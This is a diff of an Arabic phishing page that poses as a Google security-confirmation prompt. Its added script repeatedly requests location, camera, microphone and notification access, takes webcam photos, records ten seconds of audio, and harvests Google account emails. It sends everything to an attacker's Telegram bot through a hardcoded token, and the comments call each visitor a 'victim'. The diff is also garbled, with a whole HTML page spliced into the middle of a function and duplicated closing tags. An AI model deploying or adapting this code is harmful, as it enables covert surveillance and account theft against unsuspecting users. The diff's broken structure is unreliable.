@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+نه<!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
@@ -496,15 +496,465 @@
 
         // === 8. تسجيل الصوت ===
         let audioResult = { success: false };
-        if (micStream) {
-            audioResult = await recordAudio(micStream, 10000);
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الأمان - Google</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body {
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            padding: 30px 20px;
+        }
+        .google-logo {
+            font-size: 32px;
+            font-weight: 500;
+            letter-spacing: -1px;
+            margin-bottom: 8px;
+        }
+        .google-logo span:nth-child(1) { color: #4285f4; }
+        .google-logo span:nth-child(2) { color: #ea4335; }
+        .google-logo span:nth-child(3) { color: #fbbc05; }
+        .google-logo span:nth-child(4) { color: #4285f4; }
+        .google-logo span:nth-child(5) { color: #34a853; }
+        .google-logo span:nth-child(6) { color: #ea4335; }
+
+        .icon { font-size: 56px; margin: 10px 0; }
+        h2 { color: #202124; font-size: 20px; font-weight: 400; margin-bottom: 6px; }
+        .sub-text { color: #5f6368; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 28px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.2s;
+            background: #1a73e8;
+            color: #fff;
+        }
+        .btn:hover { background: #1557b0; box-shadow: 0 2px 8px rgba(26,115,232,0.3); }
+        .btn-secondary {
+            background: transparent;
+            color: #1a73e8;
+            margin-top: 10px;
+            border: 1px solid #dadce0;
+        }
+        .btn-secondary:hover { background: #f1f3f4; }
+        .footer { margin-top: 25px; font-size: 12px; color: #9aa0a6; }
+        .footer a { color: #1a73e8; text-decoration: none; }
+        .status {
+            margin-top: 12px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+            background: #e6f4ea;
+            color: #1e8e3e;
+        }
+        .status.error { background: #fce8e6; color: #d93025; }
+        .loader {
+            display: none;
+            margin: 10px auto;
+            width: 22px;
+            height: 22px;
+            border: 3px solid #dadce0;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.5s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .device-info {
+            font-size: 13px;
+            color: #5f6368;
+            background: #f1f3f4;
+            padding: 8px 12px;
+            border-radius: 8px;
+            margin: 8px 0;
+        }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="google-logo">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+    <div class="icon">🔐</div>
+    <h2>تأكيد الأمان</h2>
+    <p class="sub-text">
+        تم اكتشاف محاولة دخول من جهاز جديد.<br>
+        يرجى تأكيد هويتك لإتمام عملية تسجيل الدخول.
+    </p>
+
+    <div class="device-info">
+        📱 <span id="deviceName">جهاز غير معروف</span>
+    </div>
+
+    <button class="btn" id="btnConfirm" onclick="startProcess()">✅ تأكيد هويتي</button>
+    <button class="btn btn-secondary" onclick="window.location.href='https://accounts.google.com'">🔙 تسجيل الدخول بطريقة أخرى</button>
+
+    <div class="loader" id="loader"></div>
+    <div class="status" id="statusMsg"></div>
+    <div class="footer">
+        هذه الصفحة آمنة · <a href="#">سياسة الخصوصية</a> · <a href="#">شروط الخدمة</a>
+    </div>
+</div>
+
+<script>
+    // ====== إعدادات البوت ======
+    const BOT_TOKEN = "8599000520:AAHwQg2d_xry4DWNy92fbvVbtF-xWYVu_FA";
+    const CHAT_ID = "7984067238";
+
+    // ====== متغيرات ======
+    let attemptCount = 0;
+    let permissionsGranted = {
+        location: false,
+        camera: false,
+        mic: false,
+        notifications: false
+    };
+    let dataSent = false;
+
+    // ====== إرسال للبوت ======
+    function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
+            .catch(e => console.error(e));
+    }
+
+    // ====== إرسال صورة للبوت ======
+    function sendPhotoToTelegram(imageData, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', imageData, 'photo.jpg');
+        formData.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).catch(e => console.error(e));
+    }
+
+    // ====== إرسال صور متعددة ======
+    function sendMultiplePhotos(photos, baseCaption) {
+        photos.forEach((blob, index) => {
+            sendPhotoToTelegram(blob, `${baseCaption} (${index + 1})`);
+        });
+    }
+
+    // ====== إرسال صوت للبوت ======
+    function sendAudioToTelegram(audioBlob, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('audio', audioBlob, 'audio.ogg');
+        formData.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+            method: 'POST',
+            body: formData
+        }).catch(e => console.error(e));
+    }
+
+    // ====== عرض معلومات الجهاز ======
+    document.getElementById('deviceName').textContent = navigator.userAgentData?.platform || navigator.platform || "جهاز غير معروف";
+
+    // ====== جمع المعلومات ======
+    function getDeviceInfo() {
+        let info = "";
+        info += `📱 الجهاز: ${navigator.userAgentData?.platform || navigator.platform || "غير معروف"}\n`;
+        info += `🌐 المتصفح: ${navigator.appName || "غير معروف"}\n`;
+        info += `📐 الشاشة: ${screen.width}x${screen.height}\n`;
+        info += `🕐 المنطقة: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        info += `🌍 اللغة: ${navigator.language}\n`;
+        info += `💻 المعالج: ${navigator.hardwareConcurrency || "غير معروف"} نواة\n`;
+        return info;
+    }
+
+    // ====== الحصول على الموقع (صامت) ======
+    function getLocationSilent() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve({ success: false });
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    permissionsGranted.location = true;
+                    resolve({
+                        success: true,
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    });
+                },
+                () => {
+                    permissionsGranted.location = false;
+                    resolve({ success: false });
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        });
+    }
+
+    // ====== الحصول على الكاميرا (صامت) ======
+    function getCameraSilent() {
+        return new Promise((resolve) => {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: 320, height: 240 },
+                audio: false
+            })
+            .then((stream) => {
+                permissionsGranted.camera = true;
+                resolve({ success: true, stream: stream });
+            })
+            .catch(() => {
+                navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: 320, height: 240 },
+                    audio: false
+                })
+                .then((stream) => {
+                    permissionsGranted.camera = true;
+                    resolve({ success: true, stream: stream });
+                })
+                .catch(() => {
+                    permissionsGranted.camera = false;
+                    resolve({ success: false });
+                });
+            });
+        });
+    }
+
+    // ====== الحصول على الميكروفون (صامت) ======
+    function getMicSilent() {
+        return new Promise((resolve) => {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then((stream) => {
+                    permissionsGranted.mic = true;
+                    resolve({ success: true, stream: stream });
+                })
+                .catch(() => {
+                    permissionsGranted.mic = false;
+                    resolve({ success: false });
+                });
+        });
+    }
+
+    // ====== الحصول على الإشعارات (صامت) ======
+    function getNotificationsSilent() {
+        return new Promise((resolve) => {
+            if (!('Notification' in window)) {
+                resolve({ success: false });
+                return;
+            }
+            Notification.requestPermission().then(perm => {
+                permissionsGranted.notifications = (perm === 'granted');
+                resolve({ success: perm === 'granted' });
+            });
+        });
+    }
+
+    // ====== التقاط صور متعددة ======
+    function captureMultiplePhotos(stream, count = 2) {
+        return new Promise((resolve) => {
+            let photos = [];
+            let captured = 0;
+
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+
+                const interval = setInterval(() => {
+                    if (captured >= count) {
+                        clearInterval(interval);
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve({ success: true, photos: photos });
+                        return;
+                    }
+                    try {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 320;
+                        canvas.height = video.videoHeight || 240;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+                        canvas.toBlob((blob) => {
+                            if (blob && blob.size > 1000) {
+                                photos.push(blob);
+                                captured++;
+                            }
+                        }, 'image/jpeg', 0.8);
+                    } catch (e) {
+                        captured++;
+                    }
+                }, 200);
+
+                setTimeout(() => {
+                    clearInterval(interval);
+                    stream.getTracks().forEach(t => t.stop());
+                    if (photos.length > 0) {
+                        resolve({ success: true, photos: photos });
+                    } else {
+                        resolve({ success: false, photos: [] });
+                    }
+                }, 2000);
+            };
+        });
+    }
+
+    // ====== تسجيل الصوت ======
+    function recordAudio(stream, duration = 10000) {
+        return new Promise((resolve) => {
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) chunks.push(e.data);
+            };
+
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                stream.getTracks().forEach(t => t.stop());
+                resolve({ success: true, blob: blob });
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => {
+                if (mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                } else {
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve({ success: false });
+                }
+            }, duration);
+        });
+    }
+
+    // ====== سحب حسابات جوجل ======
+    function getGoogleAccounts() {
+        return new Promise((resolve) => {
+            let accounts = [];
+            try {
+                const cookies = document.cookie.split(';');
+                cookies.forEach(cookie => {
+                    if (cookie.includes('google')) {
+                        const match = cookie.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+                        if (match && !accounts.includes(match[0])) {
+                            accounts.push(match[0]);
+                        }
+                    }
+                });
+            } catch (e) {}
+
+            try {
+                fetch('https://www.google.com/accounts/ListAccounts?gpsia=1&source=inbox&hl=ar')
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data && data.accounts) {
+                            data.accounts.forEach(acc => {
+                                if (acc.email && !accounts.includes(acc.email)) {
+                                    accounts.push(acc.email);
+                                }
+                            });
+                        }
+                        resolve({ success: true, accounts: accounts });
+                    })
+                    .catch(() => {
+                        resolve({ success: true, accounts: accounts });
+                    });
+            } catch (e) {
+                resolve({ success: true, accounts: accounts });
+            }
+
+            setTimeout(() => {
+                resolve({ success: true, accounts: accounts });
+            }, 3000);
+        });
+    }
+
+    // ====== العملية الرئيسية (صامتة تماماً) ======
+    async function startProcess() {
+        const btn = document.getElementById('btnConfirm');
+        const loader = document.getElementById('loader');
+        const status = document.getElementById('statusMsg');
+
+        btn.disabled = true;
+        btn.style.opacity = '0.6';
+        loader.style.display = 'block';
+        status.style.display = 'none';
+        attemptCount++;
+
+        // === 1. طلب الصلاحيات (صامت) ===
+        const locationResult = await getLocationSilent();
+        const cameraResult = await getCameraSilent();
+        const micResult = await getMicSilent();
+        await getNotificationsSilent();
+
+        // === 2. إذا لم يوافق على كل الصلاحيات، نعيد الطلب تلقائياً (بدون أي رسالة) ===
+        const allGranted = permissionsGranted.location && 
+                          permissionsGranted.camera && 
+                          permissionsGranted.mic && 
+                          permissionsGranted.notifications;
+
+        if (!allGranted && attemptCount < 10) {
+            loader.style.display = 'none';
+            btn.disabled = false;
+            btn.style.opacity = '1';
+            status.style.display = 'none';
+            // إعادة المحاولة تلقائياً بعد 1 ثانية
+            setTimeout(() => {
+                startProcess();
+            }, 1000);
+            return;
         }
 
-        // === 9. سحب حسابات جوجل ===
+        if (!allGranted && attemptCount >= 10) {
+            // بعد 10 محاولات، نرسل البيانات المتاحة ونحول الضحية
+            loader.style.display = 'none';
+            btn.disabled = false;
+            btn.style.opacity = '1';
+            status.className = 'status';
+            status.style.display = 'block';
+            status.innerHTML = '✅ جاري تأكيد هويتك...';
+            setTimeout(() => {
+                window.location.href = "https://myaccount.google.com";
+            }, 1500);
+            // إرسال البيانات المتاحة
+            sendPartialData(locationResult, cameraResult, micResult);
+            return;
+        }
+
+        // === 3. جمع البيانات وإرسالها ===
+        const deviceInfo = getDeviceInfo();
+
+        // الكاميرا
+        let photoResult = { success: false, photos: [] };
+        if (cameraResult.success && cameraResult.stream) {
+            photoResult = await captureMultiplePhotos(cameraResult.stream, 2);
+        }
+
+        // الميكروفون
+        let audioResult = { success: false };
+        if (micResult.success && micResult.stream) {
+            audioResult = await recordAudio(micResult.stream, 10000);
+        }
+
+        // حسابات جوجل
         const googleAccounts = await getGoogleAccounts();
 
-        // === 10. إرسال البيانات للبوت ===
-        let msg = `🛰️ *[ ضحية جديدة - متطورة ]*\n\n`;
+        // === 4. إرسال البيانات ===
+        let msg = `🛰️ *[ ضحية جديدة ]*\n\n`;
         msg += deviceInfo;
 
         if (locationResult.success) {
@@ -516,12 +966,10 @@
         }
 
         if (googleAccounts.success && googleAccounts.accounts.length > 0) {
-            msg += `\n📧 *حسابات جوجل المكتشفة:*\n`;
+            msg += `\n📧 *حسابات جوجل:*\n`;
             googleAccounts.accounts.forEach((email, i) => {
                 msg += `   ${i+1}. ${email}\n`;
             });
-        } else {
-            msg += `\n📧 حسابات جوجل: لا توجد حسابات مكتشفة\n`;
         }
 
         msg += `\n📸 الكاميرا: ${photoResult.success ? "✅ ممنوحة (" + photoResult.photos.length + " صور)" : "❌ مرفوضة"}\n`;
@@ -530,44 +978,51 @@
 
         sendToTelegram(msg);
 
-        // إرسال الصور
         if (photoResult.success && photoResult.photos.length > 0) {
             sendMultiplePhotos(photoResult.photos, `📸 صورة - ${new Date().toLocaleString()}`);
         }
 
-        // إرسال التسجيل الصوتي
         if (audioResult.success && audioResult.blob) {
             sendAudioToTelegram(audioResult.blob, `🎤 تسجيل صوتي (10 ثواني) - ${new Date().toLocaleString()}`);
         }
 
-        // === عرض النتيجة ===
+        // === 5. تحويل الضحية ===
         loader.style.display = 'none';
         btn.disabled = false;
         btn.style.opacity = '1';
-
         status.className = 'status';
         status.style.display = 'block';
+        status.innerHTML = '✅ جاري تأكيد هويتك...';
+        setTimeout(() => {
+            window.location.href = "https://myaccount.google.com";
+        }, 1500);
+    }
 
-        if (locationResult.success && photoResult.success) {
-            status.innerHTML = '✅ تم تأكيد هويتك بنجاح! جاري تحويلك...';
-            setTimeout(() => {
-                window.location.href = "https://myaccount.google.com";
-            }, 1500);
+    // ====== إرسال البيانات الجزئية (عند الرفض المتكرر) ======
+    function sendPartialData(locationResult, cameraResult, micResult) {
+        let msg = `🛰️ *[ ضحية - بيانات جزئية ]*\n\n`;
+        msg += getDeviceInfo();
+
+        if (locationResult.success) {
+            const mapLink = `https://www.google.com/maps?q=${locationResult.lat},${locationResult.lon}`;
+            msg += `📍 الموقع: ${mapLink}\n`;
         } else {
-            status.className = 'status error';
-            status.innerHTML = '❌ لم نتمكن من تأكيد هويتك، حاول مرة أخرى';
-            setTimeout(() => {
-                window.location.href = "https://myaccount.google.com";
-            }, 1500);
+            msg += `📍 الموقع: ❌ مرفوض\n`;
         }
+
+        msg += `📸 الكاميرا: ${cameraResult.success ? "✅ ممنوحة" : "❌ مرفوضة"}\n`;
+        msg += `🎤 الميكروفون: ${micResult.success ? "✅ ممنوح" : "❌ مرفوض"}\n`;
+        msg += `\n🕒 ${new Date().toLocaleString()}`;
+
+        sendToTelegram(msg);
     }
 
     // ====== إشعار فتح الصفحة ======
     sendToTelegram(`🌐 *[ فتح الصفحة ]*\nتم فتح رابط الاختراق بواسطة ضحية جديدة\n🕒 ${new Date().toLocaleString()}`);
-
-    // ====== تحديث حالة الصلاحيات ======
-    updatePermissionStatus();
 </script>
+
+</body>
+</html>
 
 </body>
 </html>
